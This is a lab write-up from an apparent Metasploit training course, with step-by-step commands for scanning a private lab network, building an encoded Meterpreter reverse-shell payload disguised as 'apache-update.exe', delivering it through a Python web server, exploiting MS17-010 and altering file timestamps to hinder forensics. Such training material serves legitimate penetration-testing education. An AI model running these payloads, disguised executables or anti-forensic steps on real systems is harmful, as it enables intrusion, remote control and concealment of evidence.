=========================================================
MASTERING METASPLOIT — FULL ORGANIZED WRITEUP
=========================================================

This covers:

Exercise 1 — Exploring the Metasploit Framework

Exercise 2 — Using Metasploit Utilities (msfvenom, encoders, handlers)

Exercise 3 — Working with Metasploit Framework Internals (Database, MS17-010 exploit, channels, timestomp)

Everything is explained step-by-step.

=========================================================
EXERCISE 1 — Exploring the Metasploit Framework
=========================================================
1. Navigating to the Metasploit Framework Directory
cd /usr/share/metasploit-framework
ls


You review the folder structure:

modules/

tools/

lib/

plugins/

data/

Understanding this structure helps you manually inspect modules and tools.

2. Start PostgreSQL and Initialize msfdb

Metasploit stores scan data in PostgreSQL.

sudo service postgresql start
sudo msfdb init
sudo msfconsole


Inside Metasploit, database is active.

3. Explore msfconsole

Useful commands:

banner       → rotate Metasploit banners
tips         → show helpful usage tips

4. Use Port Scan Module

Search module:

search portscan/tcp


Select module:

use 0


View details:

info


Set target range:

set RHOSTS 192.168.177.0/24
set PORTS 1-100
run


This performs a TCP connect scan.

5. View Results from the Scan

List discovered hosts:

hosts


List discovered services:

services


Metasploit automatically stores these in the database.

6. Explore Payloads, NOPs, IRB

List available payloads:

show payloads


List NOP generators:

show nops


Open Ruby shell:

irb
quit

7. HTTP Version Scanner
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.177.200
run


This returns web server + PHP version.

Answer to Exercise A.1.1:
→ PHP 5.3.2

8. Using db_nmap + db_import

Run service discovery:

db_nmap -v -sV 192.168.177.0/24


Export Nmap scan:

nmap -sC 192.168.177.0/24 -oX nmapscan.xml


Import into Metasploit:

db_import nmapscan.xml


View results:

hosts
services

=========================================================
EXERCISE 2 — Metasploit Utilities (msfvenom & Client-Side)
=========================================================
1. pattern_create Utility
cd /usr/share/metasploit-framework/tools/exploit
./pattern_create.rb -l 400
./pattern_create.rb -l 400 -s ABC


Used in exploit development for buffer offset detection.

2. msfvenom Payload Generation

List payloads:

msfvenom --list payloads


List encoders:

msfvenom --list encoders


List platforms:

msfvenom --help platforms


Generate Windows Meterpreter reverse shell:

msfvenom -a x86 --platform windows \
-p windows/meterpreter/reverse_tcp LHOST=192.168.177.18 LPORT=8080 \
-e x86/shikata_ga_nai -f exe -o ~/Desktop/apache-update.exe

3. Encode Payload 25 Times
msfvenom -a x86 --platform windows \
-p windows/meterpreter/reverse_tcp LHOST=192.168.177.18 LPORT=8080 \
-e x86/shikata_ga_nai -i 25 -f exe -o ~/Desktop/apache-update.exe

4. Deliver Payload via Python Web Server
cd Desktop
python3 -m http.server


Target (Windows 2008) browses to:

http://192.168.177.18:8000


Downloads + executes the payload.

5. Setup Metasploit Handler
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.177.18
set LPORT 8080
run


A Meterpreter session is created on Windows Server 2008.

Answer to Exercise A.2.1:
→ YES

=========================================================
EXERCISE 3 — Working With the Framework
=========================================================
1. Initialize Database
sudo service postgresql start
sudo msfdb init
sudo msfdb status
sudo msfdb reinit
sudo msfdb run
db_status

2. Scan the Network
db_nmap -sP 192.168.177.0/24

3. Port/Service/Enumeration Scans
db_nmap -sS 192.168.177.100
db_nmap -sV 192.168.177.100
db_nmap -sC 192.168.177.100

4. Vulnerability Scan (MS17-010)
sudo nmap -p445 --script smb-vuln-ms17-010 192.168.177.100


If vulnerable → proceed.

5. Exploit Using MS17-010

Search:

search ms17-010


Try exploit #4 (usually fails on iLabs because DoublePulsar is not present):

use 4


Correct exploit (ID 0):

use 0
set RHOSTS 192.168.177.100
set LHOST 192.168.177.18
exploit


You will see:

[*] WIN


Meaning exploitation succeeded.

6. Using Meterpreter execute Command

View execute help:

execute -h


You see:

-c  Channelized I/O
-z  Execute process in a subshell


Exercise question asks:
→ Option used to execute process in a subshell

Answer:
→ -z

7. Launch Commands in Channels
execute -f cmd.exe -c
execute -f notepad.exe -c
execute -f mspaint.exe -c


List channels:

channel -l


Write to a channel:

write 1
Hello World, Metasploit was here.
.


Read channel:

read 1

8. timestomp (Anti-Forensics)

View timestamps:

timestomp C:\\flag.txt -v


Modify creation time:

timestomp C:\\flag.txt -c "01/01/2000 12:00:00"


Modify all fields (not recommended):

timestomp C:\\flag.txt -z

=========================================================
WRITEUP SUMMARY (ready for pentest report conversion)
=========================================================

You have now completed:

MSF directory navigation

DB initialization

Port scanning

Service discovery

HTTP enumeration

Nmap importing into DB

msfvenom payload generation + encoding

Exploit handler setup

Python web server delivery

MS17-010 exploitation

Meterpreter command execution

Channel management

Timestomp anti-forensics

---------------------------------------------
